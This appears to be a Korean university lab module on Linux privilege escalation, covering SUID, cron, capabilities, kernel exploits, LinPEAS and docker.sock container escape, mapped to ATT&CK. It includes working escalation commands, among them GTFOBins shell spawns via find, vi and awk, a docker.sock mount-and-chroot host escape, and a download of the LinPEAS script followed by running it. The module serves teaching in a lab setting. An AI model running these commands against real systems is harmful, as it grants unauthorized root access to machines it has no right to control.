# Week 11 — Linux 권한 상승 (Privilege Escalation)

> 본 주차는 attacker 가 web shell 또는 ssh 로 일반 사용자 권한 획득 후 root 로의
> 권한 상승. LinPEAS / 수동 enum / SUID / cron / capabilities / docker.sock.

## 학습 목표

1. Linux 권한 상승 5 카테고리 (config / SUID / cron / capabilities / kernel)
2. LinPEAS 자동화 enumeration
3. SUID binary 의 GTFOBins 활용
4. cron job 의 weak permission
5. docker.sock 마운트 escape
6. ATT&CK Privilege Escalation TA0004

## 1. 5 카테고리

### 1.1 Configuration

- `/etc/sudoers` 의 NOPASSWD entry
- ssh authorized_keys
- world-writable /etc files
- weak file permission

### 1.2 SUID binary

```
find / -perm -4000 -type f 2>/dev/null
```

발견된 SUID 가 GTFOBins (https://gtfobins.github.io) 에 등록되어 있으면 root shell.

```
# /usr/bin/find 가 SUID
find . -exec /bin/sh -p \; -quit
```

### 1.3 cron

```
cat /etc/crontab
ls -la /etc/cron.*
```

cron 으로 실행되는 script 가 user-writable → script 변경으로 root 권한 코드 실행.

### 1.4 capabilities

```
getcap -r / 2>/dev/null
# /usr/bin/python3 = cap_setuid+ep → setuid(0)
```

특정 binary 에 capability 가 부여 → 부분 root 권한.

### 1.5 kernel exploit

```
uname -a
# 알려진 CVE (Dirty COW, Pwnkit, ...) 검색
searchsploit linux kernel 5.x
```

## 2. LinPEAS 자동화

```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a 2>&1 | tee /tmp/linpeas.log
```

5 카테고리 + 100+ 점검 자동.

## 3. GTFOBins

대표 SUID 의 활용:
- `vi -c ':!/bin/sh'` (vi 가 SUID)
- `awk 'BEGIN{system("/bin/sh")}'` (awk SUID)
- `find . -exec /bin/sh \;` (find SUID)
- `nmap --interactive ...` (nmap SUID legacy)

## 4. docker.sock escape

```
# host 의 docker.sock 이 컨테이너에 마운트되어 있으면
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host alpine sh
chroot /host
# = host 의 root
```

6v6 의 bastion 이 docker.sock 마운트 (학습 환경) → 컨테이너 escape 시뮬 가능.

## 5. ATT&CK

| Technique | 의미 |
|-----------|------|
| T1548.001 setuid/setgid | SUID 활용 |
| T1543.001 systemd | systemd 서비스 변조 |
| T1053.003 cron | cron job |
| T1611 Escape to Host | container escape |

## 6. 실습 1~5

### 1 — bastion 에서 enumeration

```bash
# 현재 사용자 권한 + sudo 권한 확인
#   id: uid/gid/groups (현재 user 의 권한)
#   sudo -l: sudo 가능 명령 list. NOPASSWD 표기는 비번 없이 가능
ssh 6v6-bastion 'id; sudo -l 2>&1 | head'
# 예상:
#   uid=1000(ccc) gid=1000(ccc) groups=1000(ccc),27(sudo)
#   User ccc may run: (ALL) NOPASSWD: ALL   ← 학습 환경. production 은 위험!

# SUID binary 검색
#   -perm -4000: SUID 비트 (mode & 4000)
#   -type f: 일반 파일만
#   2>/dev/null: permission denied 메시지 무시
ssh 6v6-bastion 'find / -perm -4000 -type f 2>/dev/null | head -20'
# 정상 SUID: /usr/bin/sudo, /usr/bin/su, /usr/bin/passwd, /usr/bin/chsh, /bin/mount 등
# 의심 SUID: /usr/bin/vim, /usr/bin/find, /opt/* — GTFOBins 활용 가능
```

### 2 — capabilities

```bash
# Linux capabilities — 부분 root 권한 부여 (전체 SUID 보다 정밀)
#   getcap -r /: 모든 binary 의 capability 검색 (-r recursive)
#   주요 cap:
#     cap_net_raw: raw socket (ping)
#     cap_setuid: setuid() 호출 (위험 — root 권한 상승)
#     cap_dac_read_search: 파일 read 권한 우회
ssh 6v6-bastion 'getcap -r / 2>/dev/null | head -10'
# 예상: /usr/bin/ping cap_net_raw=ep
# 의심: /usr/bin/python3 cap_setuid=ep → setuid(0) 호출 → root shell
```

### 3 — cron 분석

```bash
# /etc/crontab: 시스템 cron (root 권한)
# /etc/cron.d/: 개별 cron job 파일들
# 각 cron entry: <분> <시> <일> <월> <요일> <user> <command>
# 학습 점: user 가 root + script 가 world-writable → 권한 상승
ssh 6v6-bastion 'cat /etc/crontab; ls -la /etc/cron.d/ 2>/dev/null'
```

### 4 — LinPEAS 시뮬 (실 환경 영향 적게)

```
ssh 6v6-bastion '
# LinPEAS 다운로드 (속도 위해 일부만 시뮬)
curl -sL https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh -o /tmp/linpeas.sh 2>&1 | head -3
'
```

### 5 — docker.sock 검증

```
ssh 6v6-bastion 'ls -la /var/run/docker.sock 2>&1'
# bastion 은 docker.sock 마운트됨 (W01 의 docker ps 가능)
```

## 7. 과제

A. enumeration 보고서 (필수) — 5 카테고리 점검
B. LinPEAS 결과 (심화)
C. 권한 상승 가설 (정성)

## 8. W12 (지속성·안티포렌식) 예고

backdoor / rootkit / log 변조.
